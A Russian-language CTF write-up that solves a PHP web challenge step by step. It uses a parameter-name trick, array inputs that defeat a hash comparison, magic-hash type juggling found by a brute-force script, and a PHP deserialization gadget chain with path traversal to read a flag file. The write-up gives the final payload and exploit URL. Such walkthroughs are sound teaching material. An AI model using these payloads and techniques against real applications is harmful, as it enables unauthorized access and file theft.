
Основная логика приложения находится в файле `index.php`. 

## Проверка 1

Приложение проверяет, что GET параметр `access.level` равен `administrator`

```php
if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}
```
**Обход**: `GET /?access.level=administrator`

## Проверка 2

Код накладывает три условия на значения `primary` и `backup`

1. Типы должны совпадать - иначе запрос отклоняется
```php
if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}
```

2. Значения не  должны быть идентичны - иначе запрос тоже отклоняется
```php
if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}
```

3. Хеши значений должны совпадать
```php
$primaryMaterial = 'legacy-recovery:v1:' . $primary; 
$backupMaterial = 'legacy-recovery:v1:' . $backup;   

$primaryHash = hash('sha256', $primaryMaterial);
$backupHash = hash('sha256', $backupMaterial);

if (!hash_equals($primaryHash, $backupHash)) {
    fail_request('Recovery fingerprints do not match');
}
```

Получается противоречивое требование: значения `primary` и `backup` должны отличаться, но их хеши должны совпадать (невозможно для обычных строк)

**Обход**: `GET /?access.level=administrator&primary[]=1&backup[]=2`

 - `get_debug_type()` для обоих вернёт "array"
 - `[1] === [2]` вернёт false, т.к массивы не идентичны
 - При конкатенации строки и массива будет выдано предупрежедение `"Array to string conversion"` и подставиться просото `"Array"`
```
'legacy-recovery:v1:' . [1] -> 'legacy-recovery:v1:Array'
'legacy-recovery:v1:' . [2]  ->  'legacy-recovery:v1:Array'
```

## Проверка 3

В данном фрагменте идет проверка кода, который должен быть строкой и не более 64 символов 

```php
$code = $_GET['code'] ?? ''; 

if (!is_string($code) || strlen($code) > 64) {
    fail_request('Invalid migration code');
}
```

Далее от переменной `code` вычисляются два хеша и от каждого берутся первые 9 символов. Необходимо, чтобы хеши отличались как строки, но были равны при нестрогом сравнении

```php
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);   // 9 символв md5
$modernDigest = substr(hash('sha256', $material), 0, 9); // 9 символов sha256

/*
необходимо:
 - $legacyDigest !== $modernDigest (разные строки)
 - $legacyDigest == $modernDigest (обе строки должны быть числовые)
*/
if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', [
        'legacy' => $legacyDigest,
        'modern' => $modernDigest,
    ]);
}
```

Можно обойти, используя строки вида `0e<цифры>`. 

**Напишем скрипт:**
```python
import hashlib

PREFIX = b'ULTIMATIVE-PHP-2026:'

def func(s):
    return s[:2] == '0e' and s[2:9].isdigit()

i = 0
while True:
    m = PREFIX + str(i).encode()
    md5_9 = hashlib.md5(m).hexdigest()[:9]
    if func(md5_9):
        sha_9 = hashlib.sha256(m).hexdigest()[:9]
        if func(sha_9) and sha_9 != md5_9:
           print(i)
           break

    i += 1
```

Получаем значение: `59036305`

**Обход**: `GET /?access.level=administrator&primary[]=1&backup[]=2&code=59036305`

## Проверка 4

Приложение принимает параметр `profile`, декодирует его из base64url и десериализует PHP-объект

```php
$encodedProfile = $_GET['profile'] ?? '';

if (!is_string($encodedProfile)) {
    fail_request('Invalid profile encoding');
}

$serializedProfile = decode_base64url($encodedProfile);

if ($serializedProfile === false) {
    fail_request('Invalid profile encoding');
}

// что разрешено десериализовать
$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

// что должно вернуть
if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}
```

В `unserialize()` разрешены только `MigratedProfile` и `LegacyTemplate`, вернуться должен `MigratedProfile`

**Класс MigratedProfile**:

```
final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}
```

**Класс LegacyTemplate:**

```php
final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        // защита от LFI
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }

        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);

        return $contents === false ? '[missing template]' : $contents;
    }
}
```
В конце объект `profile` приводится к строке `(string) $profile`, вызывается метод `MigratedProfile::__toString()`, который возвращает `(string) $this->displayName`

`$displayName` объявлено без типа, поэтому туда можно положить объект класса `LegacyTemplate`, при приведении к строке вызовется метод `__toString()`, и сработает `file_get_contents()`

### Обход защиты LFI

```php
if (strpos($this->template, '../')) {
    return '[invalid template]';
}
```

`strpos()` возвращает номер позиции, а не булевое значение. Если `../` стоит в начале строки (позиция 0), то подставляется в таком виде: `if(0)` и проверка не срабатывает

Подставив `template = ../../../../flag`, поднимаемcя до корня и читиаем симлинк `flag`


### Сборка Пэйлоуда

Необходимо сериализовать `MigratedProfile`, у которого свойство `displayName` - объект `LegacyTemplate` с значением `template = '../../../../flag'`

```python
import base64

s = 'O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:16:"../../../../flag";}}'
print(base64.urlsafe_b64encode(s.encode()).rstrip(b'=').decode())
```

```
TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319
```

**Обход:** `GET /?access.level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319`





